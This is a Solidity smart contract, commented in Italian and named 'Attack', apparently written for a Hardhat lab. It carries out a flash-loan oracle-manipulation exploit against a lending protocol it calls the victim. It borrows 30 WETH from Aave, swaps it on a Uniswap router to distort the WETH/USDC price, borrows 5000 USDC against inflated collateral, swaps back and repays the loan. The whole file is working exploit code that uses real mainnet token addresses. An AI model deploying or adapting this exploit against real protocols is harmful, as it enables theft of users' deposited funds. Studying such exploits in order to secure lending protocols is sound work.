// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import { IPool } from "@aave/core-v3/contracts/interfaces/IPool.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { WETH } from "solmate/src/tokens/WETH.sol";
import "hardhat/console.sol";

// INTERFACCIA MANCANTE REINSERITA
interface IUniswapV2Router02 {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory);
}

// Interfaccia per interagire con il nostro protocollo vittima
interface ILendingProtocol {
    function deposit(uint256 _amount) external;
    function borrow(uint256 _borrowAmount) external;
    function collateralToken() external view returns (IERC20);
    function debtToken() external view returns (IERC20);
}

contract Attack {
    WETH constant WETH_CONTRACT = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    address constant USDC_ADDRESS = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    IUniswapV2Router02 public immutable uniswapRouter;
    IPool public immutable pool;
    ILendingProtocol public immutable victim;

    constructor(address _pool, address _router, address _victim) {
        pool = IPool(_pool);
        uniswapRouter = IUniswapV2Router02(_router);
        victim = ILendingProtocol(_victim);
    }

    receive() external payable {
        if (msg.value > 0) {
            WETH_CONTRACT.deposit{value: msg.value}();
        }
    }

    function attack() external payable{
        // Step 1: Depositiamo 2 WETH di collaterale nel protocollo vittima
        uint256 collateralAmount = 2 ether;
        WETH_CONTRACT.deposit{value: collateralAmount}();
        WETH_CONTRACT.approve(address(victim), collateralAmount);
        victim.deposit(collateralAmount);
        console.log("Depositati 2 WETH come collaterale nel protocollo vittima.");

        // Step 2: Richiediamo un flash loan di 30 WETH per manipolare il mercato
        uint256 loanAmount = 30 ether;
        console.log("Richiesta flash loan di 30 WETH...");
        pool.flashLoanSimple(address(this), address(WETH_CONTRACT), loanAmount, "", 0);
    }

    function executeOperation(
        address asset, // WETH
        uint256 amount, // 30 WETH
        uint256 premium,
        address,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == address(pool), "Chiamata non autorizzata");
        console.log("--- Flash Loan Ricevuto, Inizio Attacco ---");

        // 1. MANIPOLAZIONE
        IERC20(asset).approve(address(uniswapRouter), amount);
        address[] memory path = new address[](2);
        path[0] = asset;
        path[1] = USDC_ADDRESS;
        uniswapRouter.swapExactTokensForTokens(amount, 0, path, address(this), block.timestamp);
        console.log("Prezzo manipolato.");

        // 2. SFRUTTAMENTO
        uint256 borrowAmount = 5000 * 1e6; // Prendiamo in prestito 5000 USDC
        victim.borrow(borrowAmount);
        console.log("Ottenuti 5000 USDC in prestito dal protocollo vittima!");

        // 3. RIPRISTINO E RIMBORSO
        uint256 usdcBalance = IERC20(USDC_ADDRESS).balanceOf(address(this));
        IERC20(USDC_ADDRESS).approve(address(uniswapRouter), usdcBalance);
        address[] memory reversePath = new address[](2);
        reversePath[0] = USDC_ADDRESS;
        reversePath[1] = asset;
        uniswapRouter.swapExactTokensForTokens(usdcBalance, 0, reversePath, address(this), block.timestamp);
        
        // 4. Ripaghiamo il flash loan ad Aave
        uint256 totalDebt = amount + premium;
        require(IERC20(asset).balanceOf(address(this)) >= totalDebt, "Fondi insufficienti!");
        IERC20(asset).approve(address(pool), totalDebt);

        console.log("--- Attacco Riuscito, Debito Ripagato ---");
        return true;
    }
}